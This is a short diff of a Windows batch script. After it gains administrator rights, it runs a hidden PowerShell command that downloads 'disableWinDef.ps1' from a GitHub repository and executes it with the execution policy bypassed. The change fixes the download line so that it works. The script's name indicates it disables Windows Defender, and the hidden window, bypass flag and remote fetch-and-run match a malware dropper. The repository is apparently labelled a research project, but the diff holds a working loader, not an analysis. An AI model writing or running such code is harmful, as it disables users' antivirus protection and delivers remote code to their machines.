@@ -25,5 +25,5 @@ exit /B
 :gotAdmin
 cd /d "%~dp0"
 
-powershell powershell.exe -windowstyle hidden "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1' -OutFile 'disableWinDef.ps1"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1' -OutFile disableWinDef.ps1"
 powershell -NoProfile -ExecutionPolicy Bypass -File "disableWinDef.ps1"
